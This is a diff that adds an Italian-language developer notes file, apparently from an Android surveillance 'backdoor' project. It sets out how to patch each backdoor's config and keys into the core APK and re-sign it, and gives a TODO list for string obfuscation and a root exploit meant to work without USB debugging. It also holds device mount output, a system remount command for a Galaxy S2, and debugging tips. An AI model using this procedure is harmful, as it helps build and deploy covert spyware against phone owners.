@@ -1,0 +1,97 @@
+
+http://www.androidengineer.com/2010/06/using-ant-to-automate-building-android.html
+
+Manifest : debug / release / demo
+Dalvik error:  si risolve facendo un "ant clean" da console e un rebuild da eclipse 
+
+Procedura di binary patch.
+- il core e' un solo file, viene compilato con ant htrelease ed e' 
+	android_service-unaligned.apk.
+- questo file non e' firmato, contiene il config.bin da sostituire, e il file resources.bin da 
+	binary patchare.
+- alla creazione della backdoor, se e' la prima volta, devono essere create le chiavi, 
+	nella directory keys, con la procedura keysCreation.bat
+- il file core, che e' uno zip, viene decompresso in una directory temporanea.
+- il config della backdoor deve sostituire quello generico posto in res/raw/config.bin
+- le chiavi vanno binary patchate nel file res/raw/resources.bin
+- il tutto deve venire rizippato con nome android_service-patched.apk
+- il file suddetto deve venire firmato con la procedura signApk.bat
+
+
+TODO
+
+RCS_ -> ????
+Scrambling delle stringhe : 
+	1) manuale, con script ruby di scramble, in java unscramble
+	2) automatico con preprocessore
+	3) externalize strings
+Exploit: 
+	1) remount
+	2) split su diverse parti
+	3) funziona senza usb debugging
+	4) grant dei privilegi
+	5) vedere su quali telefoni va....
+Snapshot agent
+Enum -> const int
+
+
+
+$ mount
+mount
+rootfs / rootfs ro,relatime 0 0
+tmpfs /dev tmpfs rw,relatime,mode=755 0 0
+devpts /dev/pts devpts rw,relatime,mode=600 0 0
+proc /proc proc rw,relatime 0 0
+sysfs /sys sysfs rw,relatime 0 0
+none /acct cgroup rw,relatime,cpuacct 0 0
+tmpfs /mnt/asec tmpfs rw,relatime,mode=755,gid=1000 0 0
+none /dev/cpuctl cgroup rw,relatime,cpu 0 0
+/dev/block/mtdblock3 /system yaffs2 ro,relatime 0 0
+/dev/block/mtdblock5 /data yaffs2 rw,nosuid,nodev,relatime 0 0
+/dev/block/mtdblock4 /cache yaffs2 rw,nosuid,nodev,relatime 0 0
+/sys/kernel/debug /sys/kernel/debug debugfs rw,relatime 0 0
+/dev/block/vold/179:1 /mnt/sdcard vfat rw,dirsync,nosuid,nodev,noexec,relatime,uid=1000,gid=1015,fmask=0702,dmask=0702,a
+llow_utime=0020,codepage=cp437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro 0 0
+/dev/block/vold/179:1 /mnt/secure/asec vfat rw,dirsync,nosuid,nodev,noexec,relatime,uid=1000,gid=1015,fmask=0702,dmask=0
+702,allow_utime=0020,codepage=cp437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro 0 0
+tmpfs /mnt/sdcard/.android_secure tmpfs ro,relatime,size=0k,mode=000 0 0
+$ mount
+mount
+rootfs / rootfs ro,relatime 0 0
+tmpfs /dev tmpfs rw,relatime,mode=755 0 0
+devpts /dev/pts devpts rw,relatime,mode=600 0 0
+proc /proc proc rw,relatime 0 0
+sysfs /sys sysfs rw,relatime 0 0
+none /acct cgroup rw,relatime,cpuacct 0 0
+tmpfs /mnt/asec tmpfs rw,relatime,mode=755,gid=1000 0 0
+none /dev/cpuctl cgroup rw,relatime,cpu 0 0
+/dev/block/mtdblock3 /system yaffs2 ro,relatime 0 0
+/dev/block/mtdblock5 /data yaffs2 rw,nosuid,nodev,relatime 0 0
+/dev/block/mtdblock4 /cache yaffs2 rw,nosuid,nodev,relatime 0 0
+/sys/kernel/debug /sys/kernel/debug debugfs rw,relatime 0 0
+$
+
+
+Samsung glaxy s2:
+mount -o remount,ro -t ext4 /dev/block/mmcblk0p9 /system
+GT-I9100_XXKI3_insecure
+
+File di configurazione:
+Se si usa ANT il file di configurazione va messo in preprocess/config.debug.bin (se si fa ant htdebug) o
+preprocess/config.release.bin (se si fa ant htrelease). Se non si usa ant allora si puo' copiare il config.bin
+direttamente dentro res/raw/config.bin
+
+Chiavi per il file di conf:
+se si vogliono utilizzare le chiavi embeddate per debuggare da eclipse, e' necessario impostare
+com.android.service.auto.Cfg.java -> Keys = true
+Quando si fa ant htrelease Keys viene automaticamente reimpostato a false, se si fa ant htdebug
+invece Keys non viene alterato
+
+Debugging:
+Su un telefono rootato si puo' fare "kill -3 <pid>" sulla propria applicazione e viene generato un
+trace completo dello stato di tutti i thread in /data/anr/traces.txt, utile per identificare deadlock,
+e' infatti sufficiente trovare i thread che sono in MONITOR per capire quali sono bloccati (ma attenzione 
+che per default il class file e' offuscato, la mappatura comunque si trova in <project_root>/bin/proguard/mapping.txt
+nella directory del progetto). Per effettuare la deobfuscation dello stack trace e' sufficiente utilizzare
+retrace.bat|retrace.sh [-verbose] mapping.txt [<stacktrace_file>]
+Questo comando si trova in: <sdk_root>/tools/proguard/bin/ 
